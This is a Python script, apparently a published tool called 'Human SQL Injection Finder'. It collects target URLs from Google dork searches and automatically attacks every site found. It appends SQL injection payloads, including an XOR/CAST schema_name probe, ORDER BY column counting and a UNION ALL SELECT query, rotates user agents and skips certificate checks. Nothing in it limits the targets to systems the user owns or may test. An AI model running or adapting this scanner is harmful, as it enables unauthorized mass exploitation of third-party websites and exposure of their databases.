import argparse
import requests
import time
import bs4

from bs4 import BeautifulSoup
requests.packages.urllib3.disable_warnings()


#__author__      = "Jevil36239"
#__github__      = "github.com/Jevil36239"
#__Finished__    = "12 - Mei - 2023"
#__name__        = "Human SQL Injection Finder"


sqli_payload = """)'XOR(ifnull(CAST(MID((IFNULL(CAST(schema_name%20AS%20CHAR),0x20)),1,62) AS BINARY),0x20)=0)OR('"""

def print_banner():
    print(r"""
  _______            _______  _______                         
 (  ____ \|\     /|(  ____ \(  ____ \                        
 | (    \/| )   ( || (    \/| (    \/                        
 | |      | |   | || (__    | |                              
 | | ____ | |   | ||  __)   | | ____                         
 | | \_  )| |   | || (      | | \_  )                        
 | (___) || (___) || (____/\| (___) |/\                     
 (_______)(_______)(_______/(_______)\_/   Human SQL Injection Finder
    """)

def gass_eksekusi(dork, limit):
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    ]

    keywords = [
        "on line",
        "at line",
        "at row",
        "mysql_fetch_array",
        "mysql_result",
        "mysql_num_rows",
        "mysql_fetch_row",
        "mysql_fetch_assoc",
        "mysql_fetch_object",
        "mysql_list_processes",
        "mysql_list_dbs",
        "mysql_list_tables",
        "mysql_stats",
        "mysql_num_fields",
        "mysql_field_flags",
        "mysql_field_len",
        "mysql_field_type",
        "mysql_field_name",
        "mysql_unbuffered_query",
        "mysql_query",
        "mysql_pconnect",
        "mysql_connect",
        "mysql_select_db"
    ]

    hasil_link = []

    headers = {'User-Agent': user_agents[0]}

    gangle_sarching = f"http://www.google.co.in/search?q={dork}"

    hasil_results = requests.get(gangle_sarching, headers=headers, verify=False)

    if hasil_results.status_code == 200:
        soup = BeautifulSoup(hasil_results.text, 'html.parser')
        a_tags = soup.findAll('a')
        for a in a_tags:
            try:
                link = a['href']
                if 'http' in link and not any(keyword in link for keyword in keywords):
                    hasil_link.append(link)
            except KeyError:
                pass

    if limit > 0:
        hasil_link = hasil_link[:limit]

    print(f'\nFound {len(hasil_link)} | "{dork}"\n')

    for i, link in enumerate(hasil_link):
        headers = {'User-Agent': user_agents[i % 3]}

        sqli_check_normal = link + "'"
        sqli_check_inject = link + sqli_payload

        try:
            http_normal = requests.get(sqli_check_normal, headers=headers, verify=False)
            http_inject = requests.get(sqli_check_inject, headers=headers, verify=False)

            if http_inject.status_code >= 400 or len(http_normal.content) <= len(http_inject.content):
                continue

            soup = BeautifulSoup(http_inject.text, 'html.parser')

            if any(keyword in soup.text for keyword in keywords):
                print(f"FOUND VULN | {link}")

                nomor_coloums = 1
                while True:
                    payload = f"' ORDER BY {nomor_coloums}--+"            
                    inject_test = link + payload
                    http_inject = requests.get(inject_test, headers=headers, verify=False)

                    if http_inject.status_code < 400 and len(http_normal.content) > len(http_inject.content):
                        break

                    nomor_coloums += 1

                payload = "'+UNION+ALL+SELECT+" + ','.join([str(i) for i in range(1, nomor_coloums)]) + "--+-"
                inject_test = link + payload
                http_inject = requests.get(inject_test, headers=headers, verify=False)

                print(f"QUERY | {inject_test}\n")
            else:
                print(f"NOT VULN | {link}")

        except requests.exceptions.SSLError:
            continue

        time.sleep(2)

def main():
    print_banner()
    parser = argparse.ArgumentParser(description='Find SQL injection vulnerabilities using Google dorks')
    parser.add_argument('dorks', type=str, nargs='+', help='List of Google dorks to run')
    parser.add_argument('--limit', type=int, default=0, help='Limit on the number of websites to check for each dork (default is to check all)')

    args = parser.parse_args()

    for dork in args.dorks:
        gass_eksekusi(dork, args.limit)

if __name__ == '__main__':
    main()

# example usage: python sql_injection_finder.py "inlink:index.php?id=" "inlink:gallery.php?id=" --limit 5
# payload = f"' UNION ALL SELECT {','.join(['NULL']*nomor_coloums)}#" 
 
